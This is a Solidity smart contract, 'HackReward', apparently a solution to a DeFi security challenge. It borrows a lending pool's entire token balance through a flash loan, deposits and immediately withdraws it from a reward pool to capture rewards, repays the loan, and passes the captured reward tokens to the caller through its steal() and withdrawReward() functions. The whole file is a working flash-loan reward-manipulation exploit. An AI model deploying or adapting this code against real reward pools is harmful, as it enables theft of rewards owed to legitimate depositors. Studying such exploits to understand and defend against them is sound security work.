// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashloan {
    function flashLoan(uint256 amount) external;
}

interface IPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}

contract HackReward {

    IERC20 token;
    address rewardPool;
    address flashloanPool;

    constructor(address _token, address _rewardPool, address _flashloan) {
        token = IERC20(_token);
        rewardPool = _rewardPool;
        flashloanPool = _flashloan;
    }

    function steal() external {
        uint256 balance = token.balanceOf(flashloanPool);
        IFlashloan(flashloanPool).flashLoan(balance);
    }

    function withdrawReward(address rewardToken) external {
        uint256 balance = IERC20(rewardToken).balanceOf(address(this));
        IERC20(rewardToken).transfer(msg.sender, balance);
    }

    function receiveFlashLoan(uint256 amount) external {
        token.approve(rewardPool, type(uint256).max);
        IPool(rewardPool).deposit(amount);
        IPool(rewardPool).withdraw(amount);
        token.transfer(address(flashloanPool), amount);
    }


}